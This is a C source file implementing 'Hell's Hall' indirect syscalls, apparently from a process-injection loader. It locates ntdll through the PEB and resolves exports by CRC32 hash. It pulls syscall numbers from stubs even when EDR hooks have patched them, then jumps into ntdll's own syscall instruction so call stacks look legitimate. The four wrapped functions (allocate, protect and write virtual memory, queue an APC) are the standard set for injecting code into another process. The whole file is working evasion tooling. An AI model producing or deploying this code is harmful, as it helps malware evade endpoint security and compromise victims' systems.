/*
 * hellhall.c
 *
 * Hell's Hall indirect syscall implementation.
 * Adapted from Hell's Hall (MalDevAcademy), ported to Clang/x64/NASM.
 *
 * Replaces SysWhispers3.  inject.c is unchanged — NTAVM/NTPVM/NTWVM/NTQAT
 * are exported with identical signatures.
 *
 * How it works:
 *   1. Walk the PEB InMemoryOrderModuleList to find ntdll base.
 *   2. Enumerate the export directory; for each export, CRC32b-hash the name.
 *   3. Once matched, scan the stub body for "MOV R10,RCX; MOV EAX,<SSN>"
 *      to extract the syscall number (works even on hooked stubs).
 *   4. Find the nearest "syscall" (0F 05) instruction within the stub.
 *   5. SetConfig(SSN, &syscall_instr) stores both in .data globals.
 *   6. HellHall_Nt*() does:  MOV R10,RCX ; MOV EAX,[SSN] ; JMP [syscall_instr]
 *      — execution resurfaces inside ntdll, making call stacks look legitimate.
 */

#include <windows.h>
#include "hellhall.h"
#include "structs.h"

/* -------------------------------------------------------------------------- */
/* Internal ntdll export-table context (populated once)                       */
/* -------------------------------------------------------------------------- */
typedef struct _HH_NTDLL {
    PBYTE                   pBase;
    PIMAGE_DOS_HEADER       pDos;
    PIMAGE_NT_HEADERS       pNt;
    PIMAGE_EXPORT_DIRECTORY pExp;
    PDWORD                  pdwFunctions;
    PDWORD                  pdwNames;
    PWORD                   pwOrdinals;
} HH_NTDLL;

static HH_NTDLL  gNtdll  = { 0 };

/* Per-syscall cache — resolved once; avoids repeated export-table scans      */
typedef struct _HH_CACHE {
    SysFunc NtAllocateVirtualMemory;
    SysFunc NtProtectVirtualMemory;
    SysFunc NtWriteVirtualMemory;
    SysFunc NtQueueApcThread;
} HH_CACHE;

static HH_CACHE  gCache   = { 0 };
static BOOL      gReady   = FALSE;

/* -------------------------------------------------------------------------- */
/* CRC32b                                                                      */
/* -------------------------------------------------------------------------- */
hh_u32 HH_Crc32b(const hh_u8 *str)
{
    hh_u32 crc = 0xFFFFFFFFu;
    int i = 0;
    while (str[i]) {
        hh_u32 byte = (hh_u32)str[i];
        crc ^= byte;
        for (int j = 7; j >= 0; j--) {
            hh_u32 mask = (hh_u32)(-(int)(crc & 1u));
            crc = (crc >> 1) ^ (HH_SEED & mask);
        }
        i++;
    }
    return ~crc;
}

/* -------------------------------------------------------------------------- */
/* Populate ntdll export-table pointers (once)                                */
/* -------------------------------------------------------------------------- */
BOOL HH_InitNtdll(VOID)
{
    if (gNtdll.pBase) return TRUE;

    /* Walk PEB -> LDR InMemoryOrderModuleList:
     *   [1] = the process image itself
     *   [2] = ntdll.dll  (always second in InMemoryOrder)
     *
     *  Flink of InMemoryOrderModuleList -> InMemoryOrderLinks of entry[1]
     *  .Flink                           -> InMemoryOrderLinks of entry[2] (ntdll)
     *  - 0x10                           -> base of LDR_DATA_TABLE_ENTRY (InMemoryOrderLinks is at +0x10)
     *  ->DllBase                        -> ntdll image base
     */
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb) return FALSE;

    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(
        (PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    if (!pDte) return FALSE;

    gNtdll.pBase = (PBYTE)pDte->DllBase;
    if (!gNtdll.pBase) return FALSE;

    gNtdll.pDos = (PIMAGE_DOS_HEADER)gNtdll.pBase;
    if (gNtdll.pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    gNtdll.pNt = (PIMAGE_NT_HEADERS)(gNtdll.pBase + gNtdll.pDos->e_lfanew);
    if (gNtdll.pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    gNtdll.pExp = (PIMAGE_EXPORT_DIRECTORY)(gNtdll.pBase +
        gNtdll.pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!gNtdll.pExp || !gNtdll.pExp->Base) return FALSE;

    gNtdll.pdwFunctions = (PDWORD)(gNtdll.pBase + gNtdll.pExp->AddressOfFunctions);
    gNtdll.pdwNames     = (PDWORD)(gNtdll.pBase + gNtdll.pExp->AddressOfNames);
    gNtdll.pwOrdinals   = (PWORD) (gNtdll.pBase + gNtdll.pExp->AddressOfNameOrdinals);

    return TRUE;
}

/* -------------------------------------------------------------------------- */
/* Resolve SSN + indirect syscall address for one NT function                 */
/* -------------------------------------------------------------------------- */
BOOL HH_InitSysFunc(IN hh_u32 uHash, OUT PSysFunc psF)
{
    if (!uHash || !psF) return FALSE;
    if (!gNtdll.pBase && !HH_InitNtdll()) return FALSE;

    RtlSecureZeroMemory(psF, sizeof(SysFunc));

    for (DWORD i = 0; i < gNtdll.pExp->NumberOfNames; i++) {
        CHAR *name = (CHAR *)(gNtdll.pBase + gNtdll.pdwNames[i]);

        if (HH_Crc32b((hh_u8 *)name) != uHash)
            continue;

        psF->uHash    = uHash;
        psF->pAddress = (PBYTE)(gNtdll.pBase +
                        gNtdll.pdwFunctions[gNtdll.pwOrdinals[i]]);

        /* Scan stub body for:
         *   4C 8B D1       mov r10, rcx
         *   B8 lo hi 00 00 mov eax, <SSN>
         *
         * Works even when the first few bytes are hooked/patched, because
         * EDR hooks typically only overwrite the first 5-10 bytes (the jmp).
         */
        for (DWORD j = 0; j < 0x50; j++) {
            /* Hit a ret before finding the pattern — stub is trampolined oddly */
            if (*((PBYTE)psF->pAddress + j) == 0xC3)
                return FALSE;

            if (*((PBYTE)psF->pAddress + j + 0) == 0x4C &&
                *((PBYTE)psF->pAddress + j + 1) == 0x8B &&
                *((PBYTE)psF->pAddress + j + 2) == 0xD1 &&
                *((PBYTE)psF->pAddress + j + 3) == 0xB8)
            {
                BYTE lo = *((PBYTE)psF->pAddress + j + 4);
                BYTE hi = *((PBYTE)psF->pAddress + j + 5);
                psF->wSSN = (WORD)((hi << 8) | lo);

                /* Find the nearest 'syscall' (0F 05) instruction */
                for (DWORD z = 0, x = 1; z <= HH_RANGE; z++, x++) {
                    if (*((PBYTE)psF->pAddress + j + z) == 0x0F &&
                        *((PBYTE)psF->pAddress + j + x) == 0x05)
                    {
                        psF->pInst = (PVOID)((PBYTE)psF->pAddress + j + z);
                        break;
                    }
                }

                return (psF->wSSN != 0 && psF->pInst != NULL) ? TRUE : FALSE;
            }
        }
    }

    return FALSE;
}

/* -------------------------------------------------------------------------- */
/* One-time init — resolve all 4 syscalls and cache                           */
/* -------------------------------------------------------------------------- */
BOOL HH_Initialize(VOID)
{
    if (gReady) return TRUE;

    RtlSecureZeroMemory(&gCache, sizeof(HH_CACHE));

    if (!HH_InitSysFunc(HH_HASH_NtAllocateVirtualMemory, &gCache.NtAllocateVirtualMemory)) return FALSE;
    if (!HH_InitSysFunc(HH_HASH_NtProtectVirtualMemory,  &gCache.NtProtectVirtualMemory))  return FALSE;
    if (!HH_InitSysFunc(HH_HASH_NtWriteVirtualMemory,    &gCache.NtWriteVirtualMemory))    return FALSE;
    if (!HH_InitSysFunc(HH_HASH_NtQueueApcThread,        &gCache.NtQueueApcThread))        return FALSE;

    gReady = TRUE;
    return TRUE;
}

/* -------------------------------------------------------------------------- */
/* Public wrappers — drop-in replacements for the old SysWhispers3 stubs      */
/* -------------------------------------------------------------------------- */

NTSTATUS NTAVM(
    IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType, IN ULONG Protect)
{
    if (!HH_Initialize()) return (NTSTATUS)0xC0000001L;
    SYSCALL(gCache.NtAllocateVirtualMemory);
    return HellHall_NtAVM(ProcessHandle, BaseAddress,
                          ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS NTPVM(
    IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect)
{
    if (!HH_Initialize()) return (NTSTATUS)0xC0000001L;
    SYSCALL(gCache.NtProtectVirtualMemory);
    return HellHall_NtPVM(ProcessHandle, BaseAddress,
                          RegionSize, NewProtect, OldProtect);
}

NTSTATUS NTWVM(
    IN HANDLE ProcessHandle, IN PVOID BaseAddress,
    IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten)
{
    if (!HH_Initialize()) return (NTSTATUS)0xC0000001L;
    SYSCALL(gCache.NtWriteVirtualMemory);
    return HellHall_NtWVM(ProcessHandle, BaseAddress,
                          Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS NTQAT(
    IN HANDLE ThreadHandle, IN PKNORMAL_ROUTINE ApcRoutine,
    IN PVOID ApcArgument1, IN PVOID ApcArgument2, IN PVOID ApcArgument3)
{
    if (!HH_Initialize()) return (NTSTATUS)0xC0000001L;
    SYSCALL(gCache.NtQueueApcThread);
    return HellHall_NtQAT(ThreadHandle, ApcRoutine,
                          ApcArgument1, ApcArgument2, ApcArgument3);
}
